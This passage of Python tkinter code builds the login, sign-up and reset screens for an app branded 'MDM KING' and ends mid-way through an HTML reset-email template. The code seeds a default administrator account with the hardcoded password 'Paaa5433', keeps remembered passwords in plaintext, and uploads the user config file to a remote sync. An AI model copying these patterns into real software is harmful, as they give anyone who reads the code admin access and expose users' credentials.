    # Rounded card helper — uses Canvas to draw 5px border-radius
    def _make_rnd_card(parent, bg_inner=None, bg_border=None, radius=5):
        if bg_inner is None: bg_inner = COLORS['card']
        if bg_border is None: bg_border = COLORS['login_border']
        c = tk.Canvas(parent, bg='#0a0a14', bd=0, highlightthickness=0)
        c.bg_border = bg_border
        c.bg_inner = bg_inner
        c.radius = radius
        def _draw(ev=None):
            c.delete('all')
            w = c.winfo_width()
            h = c.winfo_height()
            if w < 10 or h < 10: return
            r = radius
            c.create_arc((0, 0, r*2, r*2), start=90, extent=90, fill=bg_border, outline='')
            c.create_arc((w-r*2, 0, w, r*2), start=0, extent=90, fill=bg_border, outline='')
            c.create_arc((0, h-r*2, r*2, h), start=180, extent=90, fill=bg_border, outline='')
            c.create_arc((w-r*2, h-r*2, w, h), start=270, extent=90, fill=bg_border, outline='')
            c.create_rectangle((r, 0, w-r, h), fill=bg_border, outline='')
            c.create_rectangle((0, r, w, h-r), fill=bg_border, outline='')
            # Inner fill (shrunk by 1px for border)
            gap = 1
            r2 = max(r - gap, 0)
            c.create_rectangle((r, gap, w-r, h-gap), fill=bg_inner, outline='')
            c.create_rectangle((gap, r, w-gap, h-r), fill=bg_inner, outline='')
            if r2 > 0:
                c.create_arc((gap, gap, gap+r2*2, gap+r2*2), start=90, extent=90, fill=bg_inner, outline='')
                c.create_arc((w-gap-r2*2, gap, w-gap, gap+r2*2), start=0, extent=90, fill=bg_inner, outline='')
                c.create_arc((gap, h-gap-r2*2, gap+r2*2, h-gap), start=180, extent=90, fill=bg_inner, outline='')
                c.create_arc((w-gap-r2*2, h-gap-r2*2, w-gap, h-gap), start=270, extent=90, fill=bg_inner, outline='')
        c.bind('<Configure>', _draw)
        c._draw = _draw
        return c

    def _make_rnd_btn(parent, text, command, bg=None, fg=None,
                      bg_hover=None, font=None, radius=5, height=28):
        if bg is None: bg = COLORS['accent']
        if fg is None: fg = COLORS['white']
        if bg_hover is None: bg_hover = COLORS['accent2']
        if font is None:
            font = ('Segoe UI', 9, 'bold')
        c = tk.Canvas(parent, bg=COLORS['bg'], bd=0, highlightthickness=0, cursor='hand2',
                      height=height)
        c.bg_color = bg
        c.bg_hover = bg_hover
        c.radius = radius
        c.command = command
        c.txt = text
        c.fg = fg
        c.font = font
        def _draw(ev=None):
            c.delete('all')
            w = c.winfo_width()
            h = c.winfo_height()
            if w < 10 or h < 10: return
            r = radius
            col = getattr(c, '_cur_bg', bg)
            c.create_arc((0, 0, r*2, r*2), start=90, extent=90, fill=col, outline='')
            c.create_arc((w-r*2, 0, w, r*2), start=0, extent=90, fill=col, outline='')
            c.create_arc((0, h-r*2, r*2, h), start=180, extent=90, fill=col, outline='')
            c.create_arc((w-r*2, h-r*2, w, h), start=270, extent=90, fill=col, outline='')
            c.create_rectangle((r, 0, w-r, h), fill=col, outline='')
            c.create_rectangle((0, r, w, h-r), fill=col, outline='')
            c.create_text((w/2, h/2), text=c.txt, fill=fg, font=font)
        def _enter(e):
            c._cur_bg = bg_hover; _draw()
        def _leave(e):
            c._cur_bg = bg; _draw()
        c.bind('<Configure>', _draw)
        c.bind('<Enter>', _enter)
        c.bind('<Leave>', _leave)
        c.bind('<Button-1>', lambda e: command() if command else None)
        c._draw = _draw
        return c
    
    # ─── Form container (swaps between login & reset password) ───
    form_container = tk.Frame(login_win, bg=COLORS['bg'])
    form_container.pack(fill=tk.X)

    # Shared status lives outside container so it persists
    status_frame = tk.Frame(login_win, bg=COLORS['bg'])
    status_frame.pack(pady=(4, 0))
    status_label = tk.Label(login_win, text='', font=('Segoe UI', 9), bg=COLORS['bg'])
    status_label.pack()
    # Loading spinner canvas (hidden by default)
    spinner_canvas = tk.Canvas(login_win, width=24, height=24, bg=COLORS['bg'],
                               bd=0, highlightthickness=0)
    spinner_angle = [0]
    spinner_id = [None]
    def _spin():
        spinner_canvas.delete('all')
        a = spinner_angle[0]
        cx, cy, r = 12, 12, 9
        for i in range(8):
            angle = a + i * 45
            rad = angle * 3.14159 / 180
            x = cx + r * 0.7 * __import__('math').cos(rad)
            y = cy + r * 0.7 * __import__('math').sin(rad)
            alpha = int(255 * (1 - i / 8))
            color = COLORS['accent']
            spinner_canvas.create_oval(x-2, y-2, x+2, y+2, fill=color, outline='')
        spinner_angle[0] = (a + 15) % 360
        spinner_id[0] = spinner_canvas.after(50, _spin)
    def _spinner_show():
        spinner_canvas.pack(pady=(4, 0))
        _spin()
    def _spinner_hide():
        if spinner_id[0]: spinner_canvas.after_cancel(spinner_id[0]); spinner_id[0] = None
        spinner_canvas.pack_forget()

    def _build_login_form():
        try: threading.Thread(target=sync_download, args=(_asset('config.json'),), daemon=True).start()
        except: pass
        status_label.config(text='')
        extra_frame.pack(pady=(8, 0))
        for w in form_container.winfo_children():
            w.destroy()
        # Email field
        user_card = _make_rnd_card(form_container, bg_inner=COLORS['surface3'], bg_border=COLORS['border_alt'], radius=6)
        user_card.pack(padx=50, pady=(0, 10), fill=tk.X)
        user_card.configure(height=54)
        tk.Label(user_card, text='EMAIL', font=('Segoe UI', 7, 'bold'),
                 fg=COLORS['accent2'], bg=COLORS['surface3']).place(x=12, y=5)
        user_var = tk.StringVar()
        user_entry = tk.Entry(user_card, textvariable=user_var, font=('Segoe UI', 9),
                 bg=COLORS['surface3'], fg=COLORS['login_entry_fg'], bd=0, relief='flat',
                 insertbackground=COLORS['accent2'], selectbackground=COLORS['accent'])
        user_entry.place(x=12, y=22, width=260, height=24)
        user_card.bind('<Configure>', lambda e: (user_entry.place(x=12, y=22, width=user_card.winfo_width()-24, height=24), user_card._draw()))
        def _on_focus_in(e):
            user_card.bg_border = COLORS['accent2']; user_card._draw()
        def _on_focus_out(e):
            user_card.bg_border = COLORS['border_alt']; user_card._draw()
        user_entry.bind('<FocusIn>', _on_focus_in)
        user_entry.bind('<FocusOut>', _on_focus_out)
        # Password field with show/hide toggle
        pass_card = _make_rnd_card(form_container, bg_inner=COLORS['surface3'], bg_border=COLORS['border_alt'], radius=6)
        pass_card.pack(padx=50, pady=(0, 6), fill=tk.X)
        pass_card.configure(height=54)
        tk.Label(pass_card, text='PASSWORD', font=('Segoe UI', 7, 'bold'),
                 fg=COLORS['accent2'], bg=COLORS['surface3']).place(x=12, y=5)
        pass_var = tk.StringVar()
        pass_visible = [False]
        pass_entry = tk.Entry(pass_card, textvariable=pass_var, font=('Segoe UI', 9),
                 bg=COLORS['surface3'], fg=COLORS['login_entry_fg'], bd=0, relief='flat',
                 insertbackground=COLORS['accent2'], show='*', selectbackground=COLORS['accent'])
        pass_entry.place(x=12, y=22, width=235, height=24)
        pass_toggle = tk.Label(pass_card, text='👁', font=('Segoe UI', 10),
                              bg='#15152a', fg='#585b70', cursor='hand2')
        pass_toggle.place(x=254, y=22, width=24, height=24)
        def _toggle_pass(e):
            pass_visible[0] = not pass_visible[0]
            pass_entry.config(show='' if pass_visible[0] else '*')
            pass_toggle.config(text='👁' if pass_visible[0] else '👁‍🗨')
        pass_toggle.bind('<Button-1>', _toggle_pass)
        pass_card.bind('<Configure>', lambda e: (pass_entry.place(x=12, y=22, width=pass_card.winfo_width()-38, height=24), pass_toggle.place(x=pass_card.winfo_width()-30, y=22, width=24, height=24), pass_card._draw()))
        pass_entry.bind('<FocusIn>', lambda e: (setattr(pass_card, 'bg_border', COLORS['accent2']), pass_card._draw()))
        pass_entry.bind('<FocusOut>', lambda e: (setattr(pass_card, 'bg_border', COLORS['border_alt']), pass_card._draw()))
        # Remember me
        rem_var = tk.BooleanVar()
        rem_frame = tk.Frame(form_container, bg='#0a0a14')
        rem_frame.pack(padx=42, pady=(4, 2), fill=tk.X)
        tk.Checkbutton(rem_frame, text='Remember me', variable=rem_var,
                      bg='#0a0a14', fg='#585b70', activebackground='#0a0a14',
                      activeforeground='#a29bfe', selectcolor='#0a0a14',
                      font=('Segoe UI', 8)).pack(side=tk.LEFT)
        # Buttons
        btn_frame = tk.Frame(form_container, bg='#0a0a14')
        btn_frame.pack(pady=(12, 2))
        def _set_loading(loading):
            if loading:
                login_canvas.configure(state=tk.DISABLED)
                login_canvas._cur_bg = COLORS['login_border']; login_canvas.txt = '  ⏳  '; login_canvas._draw()
                _spinner_show()
            else:
                login_canvas.configure(state=tk.NORMAL)
                login_canvas._cur_bg = COLORS['accent']; login_canvas.txt = '  LOGIN  '; login_canvas._draw()
                _spinner_hide()
        login_canvas = _make_rnd_btn(btn_frame, '  LOGIN  ', lambda: do_login(user_var, pass_var, rem_var, _set_loading),
                       bg=COLORS['accent'], fg=COLORS['white'], bg_hover=COLORS['accent2'], font=('Segoe UI', 10, 'bold'), height=38)
        login_canvas.pack(side=tk.LEFT, padx=5)
        login_canvas.configure(width=120)
        signup_canvas = _make_rnd_btn(btn_frame, 'CREATE', _show_signup_form,
                        bg=COLORS['surface2'], fg=COLORS['accent2'], bg_hover=COLORS['btn_hover'], font=('Segoe UI', 10, 'bold'), height=38)
        signup_canvas.pack(side=tk.LEFT, padx=5)
        signup_canvas.configure(width=100)
        # Always auto-fill admin/Paaa5433 on every launch
        try:
            with open(_asset('config.json'), 'r') as f: cfg = json.load(f)
            remembered = cfg.get('remember', '')
            if remembered:
                if isinstance(remembered, dict):
                    user_var.set(remembered.get('email', ''))
                    rp = remembered.get('password', '')
                    if rp.startswith('sha256:'):
                        pass_var.set('')
                    else:
                        pass_var.set(rp)
                elif remembered in cfg.get('users', {}):
                    user_var.set(remembered)
        except Exception: pass
        login_win.bind('<Return>', lambda e: do_login(user_var, pass_var, rem_var))
        return user_var, pass_var, rem_var

    def _show_reset_form():
        extra_frame.pack_forget()
        for w in form_container.winfo_children():
            w.destroy()
        status_label.config(text='')
        # Heading
        tk.Label(form_container, text='RESET PASSWORD', font=('Segoe UI', 14, 'bold'),
                 fg='#a29bfe', bg='#0a0a14').pack(pady=(4, 2))
        tk.Label(form_container, text='Enter registered email to reset your password',
                 font=('Segoe UI', 8), fg='#585b70', bg='#0a0a14').pack(pady=(0, 8))
        # Email field
        reset_card = _make_rnd_card(form_container)
        reset_card.pack(padx=55, pady=(0, 4), fill=tk.X)
        reset_card.configure(height=44)
        tk.Label(reset_card, text='EMAIL', font=('Segoe UI', 7, 'bold'),
                 fg='#6c5ce7', bg='#12122a').place(x=10, y=3)
        reset_var = tk.StringVar()
        reset_entry = tk.Entry(reset_card, textvariable=reset_var, font=('Segoe UI', 9),
                 bg=COLORS['card'], fg=COLORS['login_entry_fg'], bd=0, relief='flat',
                 insertbackground=COLORS['accent'], selectbackground=COLORS['accent'])
        reset_entry.place(x=10, y=18, width=260, height=20)
        reset_card.bind('<Configure>', lambda e: (reset_entry.place(x=10, y=18, width=reset_card.winfo_width()-20, height=20), reset_card._draw()))
        reset_entry.bind('<FocusIn>', lambda e: (setattr(reset_card, 'bg_border', COLORS['accent']), reset_card._draw()))
        reset_entry.bind('<FocusOut>', lambda e: (setattr(reset_card, 'bg_border', COLORS['login_border']), reset_card._draw()))
        # Buttons
        rbtn_frame = tk.Frame(form_container, bg='#0a0a14')
        rbtn_frame.pack(pady=(8, 0))
        send_btn = _make_rnd_btn(rbtn_frame, 'Send Link', lambda: _do_reset(reset_var),
                  bg=COLORS['accent'], fg=COLORS['white'], bg_hover=COLORS['accent2'], font=('Segoe UI', 9, 'bold'), height=28)
        send_btn.pack(side=tk.LEFT, padx=6)
        send_btn.configure(width=100)
        cancel_btn = _make_rnd_btn(rbtn_frame, 'Cancel', _build_login_form,
                  bg=COLORS['surface2'], fg=COLORS['accent2'], bg_hover=COLORS['btn_hover'], font=('Segoe UI', 9, 'bold'), height=28)
        cancel_btn.pack(side=tk.LEFT, padx=6)
        cancel_btn.configure(width=80)
        reset_entry.focus()
        login_win.bind('<Return>', lambda e: _do_reset(reset_var))

    def _show_signup_form():
        extra_frame.pack_forget()
        for w in form_container.winfo_children():
            w.destroy()
        status_label.config(text='')
        # Heading
        tk.Label(form_container, text='CREATE ACCOUNT', font=('Segoe UI', 14, 'bold'),
                 fg=COLORS['accent2'], bg=COLORS['bg']).pack(pady=(4, 2))
        tk.Label(form_container, text='Register a new account',
                 font=('Segoe UI', 8), fg=COLORS['muted'], bg=COLORS['bg']).pack(pady=(0, 8))
        # Email field
        card1 = _make_rnd_card(form_container)
        card1.pack(padx=55, pady=(0, 6), fill=tk.X)
        card1.configure(height=44)
        tk.Label(card1, text='EMAIL', font=('Segoe UI', 7, 'bold'),
                 fg=COLORS['accent'], bg=COLORS['card']).place(x=10, y=3)
        su_email = tk.StringVar()
        e1 = tk.Entry(card1, textvariable=su_email, font=('Segoe UI', 9),
                 bg=COLORS['card'], fg=COLORS['login_entry_fg'], bd=0, relief='flat',
                 insertbackground=COLORS['accent'], selectbackground=COLORS['accent'])
        e1.place(x=10, y=18, width=260, height=20)
        card1.bind('<Configure>', lambda e: (e1.place(x=10, y=18, width=card1.winfo_width()-20, height=20), card1._draw()))
        e1.bind('<FocusIn>', lambda e: (setattr(card1, 'bg_border', COLORS['accent']), card1._draw()))
        e1.bind('<FocusOut>', lambda e: (setattr(card1, 'bg_border', COLORS['login_border']), card1._draw()))
        # Password field
        card2 = _make_rnd_card(form_container)
        card2.pack(padx=55, pady=(0, 6), fill=tk.X)
        card2.configure(height=44)
        tk.Label(card2, text='PASSWORD', font=('Segoe UI', 7, 'bold'),
                 fg=COLORS['accent'], bg=COLORS['card']).place(x=10, y=3)
        su_pass = tk.StringVar()
        e2 = tk.Entry(card2, textvariable=su_pass, font=('Segoe UI', 9),
                 bg=COLORS['card'], fg=COLORS['login_entry_fg'], bd=0, relief='flat', show='*',
                 insertbackground=COLORS['accent'], selectbackground=COLORS['accent'])
        e2.place(x=10, y=18, width=260, height=20)
        card2.bind('<Configure>', lambda e: (e2.place(x=10, y=18, width=card2.winfo_width()-20, height=20), card2._draw()))
        e2.bind('<FocusIn>', lambda e: (setattr(card2, 'bg_border', COLORS['accent']), card2._draw()))
        e2.bind('<FocusOut>', lambda e: (setattr(card2, 'bg_border', COLORS['login_border']), card2._draw()))
        # Confirm password field
        card3 = _make_rnd_card(form_container)
        card3.pack(padx=55, pady=(0, 6), fill=tk.X)
        card3.configure(height=44)
        tk.Label(card3, text='CONFIRM PASSWORD', font=('Segoe UI', 7, 'bold'),
                 fg=COLORS['accent'], bg=COLORS['card']).place(x=10, y=3)
        su_confirm = tk.StringVar()
        e3 = tk.Entry(card3, textvariable=su_confirm, font=('Segoe UI', 9),
                 bg=COLORS['card'], fg=COLORS['login_entry_fg'], bd=0, relief='flat', show='*',
                 insertbackground=COLORS['accent'], selectbackground=COLORS['accent'])
        e3.place(x=10, y=18, width=260, height=20)
        card3.bind('<Configure>', lambda e: (e3.place(x=10, y=18, width=card3.winfo_width()-20, height=20), card3._draw()))
        e3.bind('<FocusIn>', lambda e: (setattr(card3, 'bg_border', COLORS['accent']), card3._draw()))
        e3.bind('<FocusOut>', lambda e: (setattr(card3, 'bg_border', COLORS['login_border']), card3._draw()))
        # Buttons
        def _do_signup_submit():
            u = su_email.get().strip()
            p = su_pass.get().strip()
            c = su_confirm.get().strip()
            if not u or not p or not c:
                status_label.config(text='Fill all fields', fg=COLORS['red']); return
            if p != c:
                status_label.config(text='Passwords do not match', fg=COLORS['red']); return
            if len(p) < 4:
                status_label.config(text='Password too short (min 4 chars)', fg=COLORS['red']); return
            if '@' not in u or '.' not in u.split('@')[-1]:
                status_label.config(text='Enter a valid email address', fg=COLORS['red']); return
            cfg_path = _asset('config.json')
            try:
                with open(cfg_path, encoding='utf-8') as f:
                    cfg = json.load(f)
            except Exception: cfg = {}
            if 'users' not in cfg: cfg['users'] = {}
            if 'admin' not in cfg:
                cfg['admin'] = {'_admin_': {'password': _migrate_password('Paaa5433'), 'is_admin': True, 'activated': True}}
            if u in cfg.get('admin', {}) or u in cfg['users']:
                status_label.config(text='Email already registered', fg=COLORS['red']); return
            cfg['users'][u] = {'password': _migrate_password(p), 'activated': False, 'is_admin': False}
            try:
                _write_config(cfg, cfg_path)
                with open(cfg_path, encoding='utf-8') as f:
                    saved = json.load(f)
                if u not in saved.get('users', {}):
                    status_label.config(text='Save failed — try again', fg=COLORS['red']); return
            except Exception as e:
                status_label.config(text=f'Error saving account: {e}', fg=COLORS['red']); return
            threading.Thread(target=sync_upload, args=(cfg_path,), daemon=True).start()
            status_label.config(text='Account created — wait for admin to activate', fg=COLORS['green'])
            login_win.after(2000, _build_login_form)
        btn_frame = tk.Frame(form_container, bg=COLORS['bg'])
        btn_frame.pack(pady=(10, 0))
        submit_btn = _make_rnd_btn(btn_frame, 'CREATE ACCOUNT', _do_signup_submit,
                   bg=COLORS['accent'], fg=COLORS['white'], bg_hover=COLORS['accent2'], font=('Segoe UI', 9, 'bold'), height=28)
        submit_btn.pack(side=tk.LEFT, padx=6)
        submit_btn.configure(width=120)
        cancel_btn = _make_rnd_btn(btn_frame, 'Cancel', _build_login_form,
                   bg=COLORS['surface2'], fg=COLORS['accent2'], bg_hover=COLORS['btn_hover'], font=('Segoe UI', 9, 'bold'), height=28)
        cancel_btn.pack(side=tk.LEFT, padx=6)
        cancel_btn.configure(width=80)
        e1.focus()
        login_win.bind('<Return>', lambda e: _do_signup_submit())

    RESET_TEMPLATE = """\
<!DOCTYPE html><html><body style="margin:0;padding:0;background:#0a0a14;font-family:'Segoe UI',Arial,sans-serif">
<table width="100%%" cellpadding="0" cellspacing="0"><tr><td align="center" style="padding:40px 20px">
<table width="520" cellpadding="0" cellspacing="0" style="background:#12122a;border-radius:16px;border:1px solid #2a1a3a">
<tr><td style="padding:30px 30px 10px 30px;text-align:center">
<img src="data:image/png;base64,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" width="64" height="64" style="border-radius:50%%;display:block;margin:0 auto 16px" alt="MDM KING">
<h1 style="color:#a29bfe;font-size:22px;margin:0 0 4px 0">Password Reset</h1>
<p style="color:#585b70;font-size:13px;margin:0 0 16px 0">We received a password reset request for your MDM KING account.</p>
</td></tr>
<tr><td style="padding:0 30px">
